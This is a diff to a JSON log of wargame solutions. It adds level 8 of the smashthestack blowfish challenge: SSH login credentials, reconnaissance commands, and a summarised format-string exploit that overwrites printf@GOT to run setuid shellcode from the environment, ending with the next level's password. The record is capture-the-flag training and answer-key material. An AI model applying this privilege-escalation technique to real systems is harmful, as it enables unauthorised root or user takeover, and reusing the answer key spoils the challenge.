@@ -376,6 +376,75 @@
     }
    ],
    "note": "argv[0]-based strcpy overflow with byte filter (no 90/eb/cd/ff in argv[0]); argv[1+] zeroed by memset. ret2libc with byte-legal libc addresses (ASLR off): strcpy builds /bin/sh in libc's writable page, then system(dst). Verified live 2026-11-25."
+  },
+  {
+   "lvl": 8,
+   "user": "level8",
+   "pw": "w3ll_d0n3!",
+   "steps": [
+    {
+     "cmd": "ssh -p 2222 level8@blowfish.smashthestack.org",
+     "out": [
+      "level8@blowfish:~$ "
+     ]
+    },
+    {
+     "cmd": "whoami",
+     "out": [
+      "level8"
+     ]
+    },
+    {
+     "cmd": "cat ~/README",
+     "out": [
+      "There is a Format String vulnerability in /levels/level8",
+      "Exploit it and get the level9 pass."
+     ]
+    },
+    {
+     "cmd": "cat /levels/level8.c",
+     "out": [
+      "char *pointer = \"changeme\";",
+      "strncpy(buffer, argv[3], sizeof(buffer)-1);",
+      "printf(pointer); ... printf(buffer);"
+     ]
+    },
+    {
+     "cmd": "objdump -d --no-show-raw-insn /levels/level8 | sed -n '/<main>:/,/ret/p'",
+     "out": [
+      "buffer at ebp-0x48; pointer at ebp-0x4c; printf(buffer) at 0x08048432"
+     ]
+    },
+    {
+     "cmd": "objdump -R /levels/level8 | grep printf",
+     "out": [
+      "08049684 R_386_JUMP_SLOT   printf"
+     ]
+    },
+    {
+     "cmd": "cat /proc/sys/kernel/randomize_va_space",
+     "out": [
+      "0"
+     ]
+    },
+    {
+     "cmd": "vi /dev/shm/e_bf8.py",
+     "out": [
+      "(format string: 2x %hn -> printf@GOT = env shellcode; sc rides in env X)",
+      "[New] 64L, 2064C written"
+     ]
+    },
+    {
+     "cmd": "python /dev/shm/e_bf8.py",
+     "out": [
+      "(padding deluge)",
+      "uid=1008(level8) gid=1008(level8) euid=1009(level9) groups=1008(level8)",
+      "uid=1009(level9) groups=1008(level8)",
+      "Ur_t3h_sh1t"
+     ]
+    }
+   ],
+   "note": "Format string via printf(buffer). system() ruled out (bash drops the setuid euid). printf@GOT overwritten with a 55-byte setuid+execve shellcode riding in the env (env X = sc bytes; address pinned via %s self-reference at 0xbfffffcf; counts corrected for the 8 literal address bytes). Verified live 2026-11-25."
   }
  ],
  "goals": {}
